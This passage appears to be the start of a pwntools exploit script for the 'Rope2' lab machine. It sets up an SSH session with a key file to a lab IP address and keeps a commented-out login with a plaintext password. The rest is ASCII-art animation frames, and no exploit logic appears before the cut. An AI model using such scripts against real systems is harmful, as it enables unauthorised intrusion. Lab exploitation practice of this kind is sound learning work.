from pwn import *
context.log_level = 'error'
libc = ELF('./libc-2.29.so')

## You gonna need your key in /home/chromeuser/.ssh/ first
remoteShell = ssh(host = '10.10.10.196', user='chromeuser', keyfile='./id_rsa')
# remoteShell = ssh(host = '172.16.32.142', user='tester', password='123123123')

print(chr(27) + "[2J")


scene = log.progress("\t\t\t\t\t\t\t\t      :[!] Rope2 blind heap exploit by gbrsh [!]", level = logging.ERROR)
scene.status("\t\n\n\t\t\t\t\t\t\t\t\t\t\t    Connecting to host...")

scene.status("\t\n\n\t\t\t\t\t\t\t\t\t\t\t\t     Connected!")
sleep(1)
scene.status("\t\n\n\t\t\t\t\t\t\t\t\t      Now watch me blind hacking the heaP")
sleep(2)



animarr = ["""\n\n\t\t\t\t\t\t\t\t\t\t  Now watch me blind hacking the heaP

					@%%%@@@@$$############################################################$$$@%%%@%@
					%@@@@@$#####8888888&&888888888##8888888888888888888888#8#8#888888&&8#####$$@@%%%
					%@@$$###88&&&&88&&&&&&&&&&88&&&&8#8&&&&&&&&88888888888888888888888&&&88####$@@%%
					%@$$#&&88&&88888&&&&&&&8#?:-****-:?#8&88888888888888888888888888#888##88&8###$%%
					@$$##8&88888888&&&&&&&&&:*........*-&###88&8888888888888888&&&&&&&&&&&&&&88##$@%
					@$$##88888888888&&&&&#*:*....   ...,:#&*&&&&&&&&&&&&*&###888&&&&&&&*&&&&8&8##$$@
					@$##8&&&&&&&&&&&&&&&&&+-,....    ...-?*&*&&&&&&&&&*&^-:::::*?*****&&&&&&&&&&##$@
					@$#&&&**&&&&&&*****?*&8;*.. .     .,:*&***********&&:,. ....,,,**--*8**&&***&#$@
					@$#*******************:::*,....  .*:?**???*********&:,          ..*+#********#$@
					@$#************??*?:*,..,----*---:+#**???***********:,          . ,-:?*?**??*#$@
					@$#***??***??*?*&^-,..,...,:*??******????**?****???*:,           .,*,:?*????*#$@
					@$#**??*??*??*?*;*........,-*??*****????????????????^:---:-*.  *::+/*,;**??**#$$
					@$#???+:*:?????;*.....  ...,;+??????????????????????!:::!!:-.  *:::/:,-?*??**8$$
					@$#????-,,!*??**.  ...     .-+&?????++?***??????+?*;,.......    ..,:!,*+*????*$$
					$$#????-,,-?*?-.  ...      .,--::::::::-------***::-,           ...*:*,**????*$$
					@$8????-,.*+?:,.          .---**,,..............,*-****************-*,,:?????*$$
					$$&???+-,.*+**..          ,:?:-*******************-**************-*-:-,-+????*$$
					$$*+??:*..*/-,.           ,:+:-*----*..*------------*------*,..****-::,-+????*$$
					$#?++/-,  ***.            ,:++/+++++-,,-+++++++++++++++++++/*.,:++++?:,-+???+*$@
					$$?++/-,. ,:,.            ,:++//+++/-,,-+++++++++++++++++++/*.,:+///+:,*/++++?$@
					$$?++/-,**-:,...        ...*-------:-,,-+++++++++++++++++++/*.,:+///+:,*/++++?$@
					$$?++/-,-+/:,...            ......,:-,,-/+/++++++++++/////+/*.,:+///+:,*/+++/?#@
					$$?++/-,-/+*:-*,,,*,,*,,,,,,***,..,:-,,-//////////////////+/*.,:+///+*,*^+++/?$@
					$$?++/-,-::-*,*,,,,,*,,,,,,*:/^-,.,:-,,-///////////////////^*.,:////+*,,^+///?#@
					$$?///:*****-::::::---::::::;//-,.,:-,,-^^^////////^^^/////^*.,://^/+*,,*////+#@
					$$?/^//^^^^^///*::-,,://^^^^*//-,.,:-,,-^^^////////^^^^////^*.,://^/+*,,*/^^^+#@
					$$+/^^^^^*^^::--::-,.*:^^****//-,.,--,,-^^^^^^^^^^^^^^^^^^/**.,:/^^^+!,,*/^^^+#$
					$$+^^^^^^^^*::!^//-..,-*^****^^-..,--,,-^^^^^^^^^^^^**^^^^/**.,:/^*^/!,,*/^^^+#$
					$#+^^*^^^^**^***^^-,.,-!*!***^^-,.,--,,-^^^^^^^^^*******^^^**.,:^**^/!,,!^^^*+#$
					$#+^********^*^/^*-,.,-!*!!**^^-,.,:-,,-^^^^^^^^^^^******^^**.,:^**^/!,,!^^^*+#$
					$$+^*****!**--*********--**-*/^-,.,--,,-^^*^^^^^**********^**.,:**!*/;,,!^***+#$
					@$#^*!!!!!!*:--::::::::::--:***-***::**:!!!!!!!!!!!!!!!*****-*-:*!!!!:**;***^#$@
					@$#/*!!!!!!!:**:*!:**:!*:**:!!*!!!*!***!!!!!!!!!!!!!!!!!!!!!!!!!!;!!!!;!****+#$@
					@@#+*!;;;;;!!!!!!!!;;!!!!;!!!!!;;;!!;!!;!!!!!!!!!!!!!!!!!!!!!!!!;!!!!!!!!!!*+#$$
					@@$#/!!!;;;;;;;;;;;;;;;;;;!!;;::;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;!!;;!!;!!/#$@@
					%@@$$#^!;;;;!!;:::::::::::;:::::;;;;;;;;;;;;;;;;;;;;;:;;;;;;;;;;;;!!;;;;!^##$@@@
					@@@@$$##/*!!;;;::;:::;;;;;;;;;;;;;;;;;;;;;;;;;;;;:;:::;:;:;:;;;;;;!!;!*/#$$@@@@@
					@@@@@@@$$#####*^*****************************^^^***************^^&#####$$@@@%@@@
					@@@@@%@@@@@@@@$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$@@@$@@@@@@@@@@
					""", """\n\n\t\t\t\t\t\t\t\t\t\t  Now watch me blind hacking the heaP

					@%%%@@@@$$############################################################$$$@%%%@%@
					%@@@@@$#####8888888&&888888888##8888888888888888888888#8#8#888888&&8#####$$@@%%%
					%@@$$###88&&&&88&&&&&&&&&&88&&&&8#8&&&&&&&&88888888888888888888888&&&88####$@@%%
					%@$$#&&88&&88888&&&&&&&8#?:-****-:?#8&88888888888888888888888888#888##88&8###$%%
					@$$##8&88888888&&&&&&&&&:*........*-&###88&8888888888888888&&&&&&&&&&&&&&88##$@%
					@$$##88888888888&&&&&#*:*....   ...,:#&*&&&&&&&&&&&&*&###888&&&&&&&*&&&&&&8##$$@
					@$##8&&&&&&&&&&&&&&&&&+-,....    ...-?*&*&&&&&&&&&*&^-:::::*?**&**&&&&&&&&&&##$@
					@$#&&&**&&&&&&*****?*&8;*.. .     .,:*&***********&&:,. ....,,,**--*8*&&*****#$@
					@$#*******************:::*,....  .*:?**???*********&:,         ...*+#*****?**#$$
					@$#************??*?:*,..,----*---:+#**???***********:,          . ,-:?*?*??**#$$
					@$#***??***??*?*&^-,..,...,:*??******????**?****???*:,           .,*,:?*????*#$@
					@$#**??*??*??*?*;*........,-*??*****????????????????^:---:-*.  *::+/*,;**??**#$$
					@$#???+:*:?????;*.....  ...,;+??????????????????????!:::!!:-.  *:::/:,-?*??**8$$
					@$#????-,,!*??**.  ...     .-+&?????++?***??????+?*;,.......    ..,:!,*+*????*$$
					$$#????-,,-?*?-.  ...      .,--::::::::-------***::-,            ..*:*,**????*$$
					@$8????-,.*+?:,.          .---**,,..............,*-****************-*,,:?????*$$
					$$&???+-,.*+**..          ,:?:-*******************-**************-*-:-,-+????*$$
					$$*+??:*..*/-,.           ,:+:-*----*..*------------*------*,..****-::,-+????*$$
					$#?++/-,  ***.            ,:++/+++++-,,-+++++++++++++++++++/*.,:++++?:,-+???+*$@
					$$?++/-,. ,:,.            ,:++//+++/-,,-+++++++++++++++++++/*.,:+///+:,*/++++?$@
					$$?++/-,**-:,...        ...*-------:-,,-+++++++++++++++++++/*.,:+///+:,*/++++?$@
					$$?++/-,-+/:,...            ......,:-,,-/+/++++++++++/////+/*.,:+///+:,*/+++/?#@
					$$?++/-,-/+*:-*,,,*,,*,,,,,,****..,:-,,-//////////////////+/*.,:+///+*,*^+++/?$@
					$$?++/-,-::-*,*,,,,,*,,,,,,*:/^-,.,:-,,-///////////////////^*.,:////+*,,^+///?#@
					$$?///:*****-::::::---::::::;//-,.,:-,,-^^^////////^^^/////^*.,://^/+*,,*////+#@
					$$?/^//^^^^^///*::-,,://^^^^*//-,.,:-,,-^^^////////^^^^////^*.,://^/+*,,*/^^^+#@
					$$+/^^^^^*^^::--::-,.*:^^****//-,.,--,,-^^^^^^^^^^^^^^^^^^/**.,:/^^^+!,,*/^^^+#$
					$$+^^^^^^^^*::!^//-..,-*^****^^-..,--,,-^^^^^^^^^^^^**^^^^/**.,:/^*^/!,,*/^^^+#$
					$#+^^*^^^^**^***^^-,.,-!*!***^^-,.,--,,-^^^^^^^^^*******^^^**.,:^**^/!,,!^^^*+#$
					$#+^********^*^/^*-,.,-!*!!**^^-,.,:-,,-^^^^^^^^^^^******^^**.,:^**^/!,,!^^^*+#$
					$$+^*****!**--*********--**-*/^-,.,--,,-^^*^^^^^**********^**.,:**!*/;,,!^***+#$
					@$#^*!!!!!!*:--::::::::::--:***-***::**:!!!!!!!!!!!!!!!*****-*-:*!!!!:**;***^#$@
					@$#/*!!!!!!!:**:*!:**:!*:**:!!*!!!*!***!!!!!!!!!!!!!!!!!!!!!!!!!!;!!!!;!****+#$@
					@@#+*!;;;;;!!!!!!!!;;!!!!;!!!!!;;;!!;!!;!!!!!!!!!!!!!!!!!!!!!!!!;!!!!!!!!!!*+#$$
					@@$#/!!!;;;;;;;;;;;;;;;;;;!!;;::;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;!!;;!!;!!/#$@@
					%@@$$#^!;;;;!!;:::::::::::;:::::;;;;;;;;;;;;;;;;;;;;;:;;;;;;;;;;;;!!;;;;!^##$@@@
					@@@@$$##/*!!;;;::;:::;;;;;;;;;;;;;;;;;;;;;;;;;;;;:;:::;:;:;:;;;;;;!!;!*/#$$@@@@@
					@@@@@@@$$#####*^*****************************^^^***************^^&#####$$@@@%@@@
					@@@@@%@@@@@@@@$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$@@@$@@@@@@@@@@
					""", """\n\n\t\t\t\t\t\t\t\t\t\t  Now watch me blind hacking the heaP

					@%%%@@@@$$############################################################$$$@%%%@%@
					%@@@@@$####88888##888888##&88&&&888888888888888888888888888888888888#####$$@@%%%
					%@@$$###88&&888888&&&8#&::&#&&&&&&88888&8&&&8&&8888888888888888888&&&888###$@@%%
					%@$$#8&88888888888&8?:::*,:::^?*&&&&&&&&8#8*8??&&&&&&&&&8888888888888888&8###$%%
					@$$##88888888888&&&8#/*..,.*/##*&&&&&&&&#&??+--???*&&&&88888&&&8&&&&88&&&88##$@%
					@$$#888888888&&&&&*&?:::,,-::+#8&&**&&&&8*:*,.,,*:*&*&####88&&&&&&&&&&&&&88##$$@
					@$##8&&&&&&&&&&&&&***&#*::&##&#8******&&8*:*,..,*:*&*:::::;*?*&&&&&&&&&&&&&8##$@
					@$#&&*********&**&&&&&******&&&&?**???&&&*?*/--+*?&&:,. ....,,,**--&8&&&&***&#$@
					$$#**************&&&******?***&*^:-****-:/?**??&**&&:,         ...*+#*****?*&#$$
					$$#***??***************&8&***&*:,........,-&&*******:,          . ,-:?*?*??**#$$
					$$#*?????????***?****?+:::--:::*.  . .....,:*&&**??*:,           .,*,:?*????*#$@
					$$#*???*??*????*?*?;-*,,....,*-,        . .-?&***???^:---::*.  *::+/*,!&*??**#$$
					$$#???+:*:?**???*^-,...... .,-:*       ...,:?**?*???!:::!!:-.  *:::/:,-?*??**8$$
					$$8????-,,!*+??+:*.....     .-?:*... ....*:????+??*!*.......    ..,:!,*?*????&$$
					$$8????-,.-??**-,.....      .--::-,,....*-----***:::,            ..*:*,**????*$$
					$$#????:,.*+*?-,    ..   .  ,***,,..............,*-****************-*,,:?????*$$
					$$&????:,.*??-...          .*:-*******************-******-******--*-:-,-?????*$$
					$#*???:*..*+:,.            ,-:------*..*-------------------*,..*-**-::,-+????*$$
					$#?+++-,  *^*...           ,:+++++?+-,,-++++++++++++++++++?/*.,:?+++?:,-+????*$@
					$$?++/-,. ,:*.           . ,;?//?++/-,,-++++++++++++++++++?+*.*:+//++:,*/?+?+?$@
					$$?++/-,**-:,...         ...-------:-,,-+++++++++++++++++++/*.*:+///+:,*+?+++?$@
					$$?++/-,-++:,...             .....,:-,,-+++++++++++++++++++/*.,:+///+:,*/++++?#@
					$$?++/-,-/?*:-*,,*****,,**,,****..,:-,,-/+//++++++////////+/*.,:+///+*,*/+++/?#@
					$$?++/-,-::-*,*,,,,,*,,,,,,*://-,.,:-,,-//////////////////+^*.,:+///+*,,^+///?#@
					$$?+//:**-**-::::::--:::::::;//-,.,:-,,-^//////////////////^*.,:////+*,,*////?#@
					$$?/^///^^^//+/*::-,,://^^^^*//-,.,:-,,-///////////////////^*.,://^/+*,,*//^^+#@
					$#?/^^^^^*^^::--::-,.*:^^*^**//-,.,:-,,-^^^//////^^^^^^^^^/**.,:/^^^+*,,*//^^+#$
					$#?/^^^^^^^*::*///-..,-*^****^/-,.,:-,,-^^^^^^^^^^^^^^^^^^/**.,:/^^^+!,,*/^^^+#$
					$#?/^^^^^^**^***/^-,.,-!*****^^-,.,:-,,-^^^^^^^^^^*****^^^/**.,:^**^+!,,!/^^*+#$
					$#?^********^*^//*-,.,-!*!!**//-,.,:-,,-^^^^^^^^^^^*****^^^**.,:^**^+!,,!^^^*+#$
					$#?^********----*-*****--**:*/^-,.,:-,,-^^^^^^^^********^^^**.,:^***/;,,!^***+#$
					@$#/**!!!!**:--::::::::::--:***:-*-::--:!!!!!!!!!!!!!!!*****---:*!!**:**;^**^#$@
					@$#+*!*!!!!*:**:**:**:!*:**:!!^*!**!***!!!!!!!!!!!!!!!!!*!!*!!!!!!!!!!;!****?#$@
					@@#?*!!!;;;!!!!!!!!;;!!!!!!*!!!!;!!!;!!!!!!!!!!!!!!!!!!!!!!!!!!!;!!*!!!!!!!*+#$$
					@@$#/!!!;;;;!;;;;;;;;;;;;!!!;;;;;;;;;;;;;;;;!;!;;;;;;;;;;;;;!;!;;!!!;;!!;!!+#$@@
					%@@$$#^!;;;;!!;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;!!!;;;;!^##$@@@
					@@@@$$##/*!!!;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;!!;!*/#$$@@@@@
					@@@@@@@$$#####&^*****************************^^^^*^*^*^*^*^^^**^/&#####$$@@@%@@@
					@@@@@%@@@@@@@@$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$@@@$@@@@@@@@@@
					""", """\n\n\t\t\t\t\t\t\t\t\t\t  Now watch me blind hacking the heaP

					%%%%%%@$$$############################################################$$$@%%%%%%
					@%@@@@$#####8888#8888888##&88&&&888888888888888888888888###888#888888####$$@@%%%
					@@@@$####8888888888&&8#&:;&#&&&&&&&8&888888888888888888888888888888&&88####$$%%%
					%@$$#&&8888888888&&#?:::*,:::^**&&&&&&&&8#8*8??8&&&&&8&888888888##8888#8&8##$$%%
					@@$##88888888888&&&##/*..,.*/##&&&&&&&&&8&??+--???*&&&8888888&&&&&&&&&&&&88##$@%
					@$$##88888888&&&&&&&?:::,,-::+##&&&&&&&&8*:*,.,,*:*&*&###88&&&&&&&&&&&&&888##$$@
					@$##8&&&&&&&&&&&&&***&#*::&##&#8******&&8*:*,..,*:*&*:::::;*?*&&&&&&&&&&&&&&##$@
					$$#*&&********&&***&&&******&&&*?**??*&&&&?*/--+**&&:,. ....,,***--&8&&&&***&#$@
					@$#***************&&***?*???****^:-****-:/?**??&&**&:,          ..*?#*&*****&#$@
					$$#***????**********?***&&***&*:,........,-*&*******:,          . ,-;?&?**?**#$@
					$$#*?????????***???*??+:::--:::*.    .....,:*&&&**?*:,    .      .,*,:?**???*#$@
					$$#*???*?**????*?*?;-*,,.....*-,.      .. .-?&*&*???^:---::*.  *::+/*,;&*??**#$$
					@$#????:*:?**???**-,... .  .,-:*       ...,:?***????!:::!!:-.  *:::/:,-?*??**8$$
					$$8????-,,!*???+:*.....     .-?:*... ....*:?*??+?**!*.......    ..,:!,*?*??*?&$@
					$$8????:,.-??**-..  ..      .--::-,,....*-----***:::,           ...*:*,**????*$@
					@$#????:,.*?&?-,         .  ,***,,..............,*-****************-*,,:?????*$@
					$$&??*?:,.*??-,..          .*:-*******************-*****--******--*-:-,-?????*$@
					$$*???:*..*+:,.           .,-:------*..*-------------------*,..*-**-::,-+????*$@
					$$*+?+-,  *^*...        .  ,:+?+++?+-,,-+++++???++++++++++?/*.*:?+++?:,-+????*$@
					$$*++/-,  ,:,.             ,;?//+++/-,,-++++++++++++++++++?+*.*:+/+++:,*+?+?+?$@
					$$*++/-,**-:,...          ..-------:-,,-++++++++++++++++++?/*.*:+//++:,*/?+++?$@
					$$*++/-,-+/:,...              ....,:-,,-+++++++++++++++++++/*.,:+//++:,*/?+++?$@
					$$*++/-,-+?*:-*,,,***,,,********..,:-,,-++/++++++++++++++/+/*.,:+///+*,*/++++?$@
					@$?++/-,-::-*,*,,,,,*,,,,,,*:+/-,.,:-,,-//////////////////+^*.,:+///+*,,^+++/?#@
					$$?+//:****--::::::---::::::;//-,.,:-,,-//^////////////////^*.,:+///+*,,*////?#@
					$$?/^///^/^^///*::-,,://^^^^*//-..,:-,,-^/^////////////////^*.,://^/+*,,*////?#@
					$$?/^^^^^*^^::--::-,.*:^^*^**//-. ,:-,,-^/^//////^^^^^^^^^/^*.,:/^^/+*,,*/^/^?#$
					$$?/^^^^^^^*::*///-..,-*^****/^-..,:-,,-^^^^^^^^^^^^^^^^^^/**.,:/^*^+!,,*/^^^+#$
					$$?^^^^^^^^*^***/^-,.,-!*****//-,.,:-,,-^^^^^^^^^^^^^**^^^/**.,:/**^+!,,*/^^^+#$
					$$?^^*******^*^//*-,.,-!*!!**//-..,:-,,-^^^^^^^^***^^**^^^^**.,:^**^+!,,!^^^^+#$
					$$?^********:---*-*****--**:*/^-..,:-,,-^^*^^^^^********^^/**.,:^***/;,,!^*^*+#$
					@$#/****!!**:--::::::::::--:*^*:**-::--:!!!!!!!!!!!!!!******---:*!***:**;***^#$@
					@$#+*!!!!!!*:**:**:**:**:**:***!!**!****!!!!!!!!!!!!!!!!!!!*!*!!!!!!!*;!****?#$@
					@$$?*!!!!;;!*!!!!;!;;!!!!!!*!!;!;!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!;!!!!!**!!!*+#$$
					@@$#+!!!;;;;!!;;;;;;;;;;!!!!!;;;;;;;;;!!;;;!!!!!;;;;;;;;;;;!!!!!;!!!;;;!!!!+#$@@
					@%@@$#/!;;;;!!;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;!!!;;;;!/#$$@@@
					%%%@$$$#/**!;!;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;!!!!!!*/#$$@@@@@
					@@@@@%@$$#####&/**************************^^^^^^*****^^^^^^****^/&#####$@@%%%@@@
					@%@@@%@@@@@@@@$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$@@@@@@@@@@@@@@
					""", """\n\n\t\t\t\t\t\t\t\t\t\t  Now watch me blind hacking the heaP

					%%%@@%@$$$############################################################$$$@%%%%%%
					@@@@@@$#####8#8888888888##&88&&&8888888#8#88888888888#####88888888888####$$@@%%%
					@@@$$###8888888&888888#&::&#8&&&&&&&&&8888&&&&&&88888888888888888888888####$@@%%
					@@$$#888888888888&&8?::-*,-::^*&&&&&&&&&8#&*8??8&&&888888888888888888888&&##$$%%
					@@$##&88888888888&&8#/*..,.*^#8*&&&&&&&&#&??+--+??*&&&8#88888&&&&&&&&&88&88##$@%
					@$$##88888888&&&&&*&?::-,,-::+##&&&&&&&&8*:*,.,,*:*&*&8##88&&&&&&&&&&&&&888##$$@
					@$##8&&&&&&&&&&&&&***&#*::&##&##&****&&&&*:*,..,*:?&*::::::*?&&&&&&&&&&&&&&&##$$
					@$#*&&*************&&*******&&&&?**?+*&88&?*/--/*?&&:,. ....,,***--*8&&&&&**&#$@
					@$#*******************??**??****/:-****-:/**???&&**&:,          ..*+8*&***?*&#$@
					$$#*********************&&*?*&*:,........,-&&*******:,          . ,-:?&?**?*&#$@
					$$#*??????????**???**?+:::--:::*.  . .....,:*&&&****:,..         .,*,:??*??**#$@
					$$#**????**????*?*?;-*,......*-,          .-?&***???^:---:-*.. *::+/**;&*???*#$$
					$$8????:*:?**???**-,...   ..,*:,        ..,-?****???!:::!!:-.. *:::/:,-?*????8$$
					$$8????-,,!*+??+:*.....     .-?:*........*:????+?**;*......     ..,:!,*?*????&$@
					$$8????-,,-??**-... ...     ,--::-,.....*-----***:::,            ..*:*,**????&$$
					@$#????-,.*+*?-..       .   ,***,,..............,*-****************-*,,:?????*$$
					$$&????-,.*??-,.           .*:-*******************-*************--*-:-,-?????*$$
					$#&???:*..*+:,..           ,-:-*----*..**------------------*,..****-::,-+????*$$
					$$*+++-,  *^*...           ,:+++++?+-,,-++++++++++++++++++?/*.,:++++?:,-+???+*$$
					$$*++/-,  ,:,.             *;?//+++/-,,-++++++++++++++++++?/*.,:+///+:,*+?+?+?#@
					$$*++/-,**-:,...          ..-------:-,,-+++++++++++++++++++/*.,:+///+:,*/?+++?#@
					$$*++/-,-+/:,...             .....,:-,,-+++++++++++++++++++/*.,:+///+:,*/++++?#@
					$$*++/-,-++*:-*,,,,,,**,,,,,***,..,:-,,-/+//////+/////////+/*.,:+///+*,*/+++/?#@
					$$?++/-,-::-*,*,,,,,,,,,,,,*://-..,:-,,-//////////////////+^*.,:+///+*,,*+///?#$
					@$?///:*****-::::::---::::::;//-..,:-,,-//^////////////////^*.,:////+*,,*////?#$
					$$?/^//^^^^^++/*::-,,:^/^^^^*//-..,:-,,-^/^//////////^^////^*.,:////+!,,*//^^?#$
					$$?^^^^^^*^^::--::-,.*:^^****//-..,:-,,-^^^/////^^^^^^^^^^/**.,:/^^^+!,,*/^^^+#$
					$$?^^^^^^^^*::*///-,.,-*^****^^-..,:-,,-^^^^^^^^^^^^^**^^^/**.,:/*^^+!,,*/^^^+#$
					$#?^^^^^^^^*^***/^-,.,-!*****^^-..,:-,,-^^^^^^^^^******^^^/**.,:/**^+!,,!/^^*+#$
					$#?^********^*^//*-,.,-!**!**^/-..,:-,,-^^*^^^^^*********^/**.,:^**^/!,,!^^**+#$
					$#?^*******!---********--**:*/^-..,:-,,-^^*^^^^^**********^**.,:^***/!,,!^*^*+#$
					@$#/*!!!!!**:--::::::::::--:**!-**-::-*:!!!!!!!!!!!!!!!***^!-*-:*!!*!:**;^**^#$@
					@$#+!!!!!!!*:**:**:**:!*:**:****!**!!***!;!!!!!!!!!!!!!!!*!!!!!!!!!!!*;!****?#$@
					@$#?*!;;;;;!!*!!!;!;;!!!!!!**!!!;;!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!;!!!!!!!!!!*+#$$
					@@$#+!!;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;!!;;;;;;;;;;;;;;;;;;;;;;;;;;!!!!!!;!*+#$$@
					@%@$$#^!!;;;!;;;;;;;;:;:;:;;;:::;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;!;;;;;!^#$$@@@
					@%@@$$##/*!!!!;;::::::;;;;;;;;;;;;;::;;;;;;;;;;;;;;;;::::::::;;;;!!!!!*/##$$@@@@
					@@@@%@@$$#####&^**************************^^^^^^^^^^^^^^^^^^^^^^/&####$$$@@%%@@@
					@@@@@@@@@@@@@$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$@@@@@@@@@@@@@
					""", """\n\n\t\t\t\t\t\t\t\t\t\t  Now watch me blind hacking the heaP

					@@%@@@@@$$############################################################$$$@@@@%%%
					@@@@@@$####88888888888##888888888888888888888888&&&88888888888&&88888####$$@@@%%
					@@@$$###8&888888&&8888+:?&&&&&&&&&&&&88888888888&&&&&&&&&&&&&&&&8&8&8888###$$@@%
					@@$##88&&8888888&&&#?-,,*-/#8&&&&&&&&88888888&+*#&88&&&&&&8888888888888&&88##$@%
					@@$##&8888888&&&&&&#?:-*::?#*?&****&&&88&&8&:-*::+8&&&&88&&&&&&&&&&&&888&88##$@%
					@$$#888888888&&&***&&&#^**?*?^:-****-:+#&&8*-,,*-+#&&8888&&&&&&&&&&&&&&&88&###$@
					@$##8&&&&&&&&&&&&&&&****??*?:*........,:&8&&8?:+&88*::::::;^?*&*&&&&&&&&&&&8##$@
					@$#*&&**********&&&&&*&*8&+:*..........,:*&&******&&:,......,,,**--&&&&&****&#$$
					$$#**********************#+-,..    ... .-?&&**?****&:,           .*+&&&&****&#$$
					$$#*******************&?+**:,.     ....,-?*?????***&:,          ..,-:*&?****&#$$
					$##**???*??*****?***/::-******. .....,*:?*??????*?**:,          ..,*,:***??**##$
					$##**?+*?**???**??!-,.......,*------::/&***???????*?^:---:-*.. *::?/*,!&*??**##$
					$#8???+:*:?&*???/-*..... .   .-+????&&*?????*???????!:::!!:-.. *:::/:,-?*??**8$$
					$#8????-,,;*???:*......      ,:&?*&&&&8*???+?++/+**!*......     .,,:!,*?*????&$$
					$#8????-,.-??***... ...      ,-:::::::::----*-***:::,            ..*:*,**????*$$
					$$8??*?:,.*+*?-,            .***,,..............,*-****************-*,,:?????*$$
					$$&??*?-..*+?-..           .,-********************-*************--*-:-,-?????*$$
					$$&???:*. *+:,.            .*--*----*..*-----------**------*,..****-::,-+????*$@
					$#*+++-,  ***...           ,-+++++++-,,-+++++??+++++++++++?/*.,:?+++?:,-+???+*$@
					$#*++/-,  ,:,              ,;?//++//-,,-++++++++++++++++++?/*.,:++//+:,*+?+?+?#@
					$#*++/-,**-:,..           ..-------:-,,-++++++++++++++++++?/*.,:+///+:,*+++++?#@
					$$*+++-,-+/:,..              .....,:-,,-+++++++++++++++++++/*.,:+///+:,*/+++/?#$
					$$*++/-,-++*:-*,,,,,,,,,,,,,***,..,:-,,-+++///////////////+/*.,:+///+*,*^+++/?#$
					$$*+//-,-::-*,*,,,,,,,,,,,,*://-,.,:-,,-//////////////////+^*.,:+///+*,,*++//?#$
					@$?///:****--::::::---::::::;//-,.,:-,,-^//////////////////^*.,:////+*,,*+//^?#$
					$#?/^//^^^^//+/*::-,,://^^^^*//-,.,:-,,-^^/////////////////**.,:/^//+*,,*///^?#$
					$#?/^^^^^^*^::--::-,.*:*^***^//-..,:-,,-^^/^^^^^^^^^^^^^^^/**.,:/^^^+!,,*/^^^+#$
					$#?^^^^^^^^*::*//^-. ,-*^****^^-..,:-,,-^^^^^^^^^^^^^^^^^^/**.,:/^^^/!,,*/^^^+#$
					$#?^*^^^^^^*^***/^-..,-******/^-..,:-,,-^^^^^^^^^*******^^/**.,:^*^^+!,,!/^^*+#$
					$$?^********^*^/^*-,.,-!*!;**//-..,:-,.-^^^^^^^^********^^/**.,:^**^+!,,!/^^*+#$
					$$?^********--***-*****--**-*/^-..,:-,,-^^*^^^^^*********^^**.,:^***/;,,!^***+#$
					@$#/**!!!!!*:--::::::::::--:***-**-::-*-!*!!!!!!!!!!!!*****!-*-:*!*!*:**;***/#$@
					@$#+*!!!!!!!:**:^!:**:!*:**:****!**!!***!!!!!!!!!!!;;!!!!!!!!*!!;!!!!!;*!***?#$$
					@@#?*!!!!;;;*!;!!!!;;!!!!;!**!!!;!!;;!!!!!!!!!!!!!!!!!!!!!!!!!!;;!!!!!!!!!!*+#$@
					@@$#/!!;!;;;!!;;;;;;;;;;;;;!;;;;;;;;;;!!;;;;;;;;;;;;;;;;;;;!!!!!;;!!;;!!!!!+#$$@
					@@@@##/!;;:;;;;;;;;;;;;;;;;;;:::;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;!!;;;;!/##$@@@
					@@@@$$##+*!!!;;;:::::;;;;;;;;;;;;;;;;;;;;;;;;;;;;:;:;::::::;;;;;;;!!;!*/##$@@@@@
					@@@@@@@$$####8*/************************^*^^^^^^^^^^^^^^^^^*^^^^/&#####$$@@@@@@@
					@@@@@@@@@@@@@$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$@@@@@@@@@@@@@
					""", """\n\n\t\t\t\t\t\t\t\t\t\t  Now watch me blind hacking the heaP

					@@@@@@@$$$#############################################################$$@@@@@@@
					@@@@@$$####888888888888888888888888888888888888888888888888888888&&88####$$@@@@@
					@@@$$###8&&&&&&&&&&&&&&&&&88&&&&888&&&&&&&&&&&&&88888888888888888&8&8888###$$@@@
					@@$##&&88&&&&&&&&&&&&&&8#?:-****-:?8&&&&&&88888888888888888888888888888&&&8##$@@
					@$$#8&&888888888&&&&&&&&:*........*-&#88&&&88888&8888&88888&&&&&&&&&&&&&&88##$@@
					@$##88&&&&&8888&&&&&&#*:,....   ...,:#&*&&&&&&&&&&&**&8#888&&&&&&&*&&&&&&&&8##$$
					@$##8&&&&&&&&&&&&&&&&&+-,..     ....-?*&*&&&&&&&&*&&^-:::::*?**&&&&&*&&&&&&&##$$
					$$#&&&***************&&!*..       .,:?&************&:,. ....,,,**--*&********#$$
					$$#***************?***:::*,.... ..*:?**???*********&:,          ..*+8********#$$
					$$#*************?*?:*,..,----*---:+8*?????**********:,           .*-:?*?**?**##$
					$$#***??*********/-,..,...,:*??**&***??????????????*:,           .,*,:??????*##$
					$$#***?**?*????*;*..... ...-*??*?**?????????????????^:---:-*.  *::+/*,;**???*##$
					$$#????:*:?*???;*.. .   ...,;+?????????***??????????;:::!!:-.  *:::/:,-?*??*?8#$
					$$#????-,,!*??**.. ..      .-+&?????++?**???????+?*;*......     ..,:!,*+*????&$$
					$##????-,,-+*?-.  ...      .,--::::::::-------***::-,           ...*:*,**????*#$
					$$#????-,.*+?:,.        . .---**,,,.............,*-****************-*,,:?????*#$
					$#&????-,.*+**..          ,:?:-*******************-*************--*-:-,-+????*#$
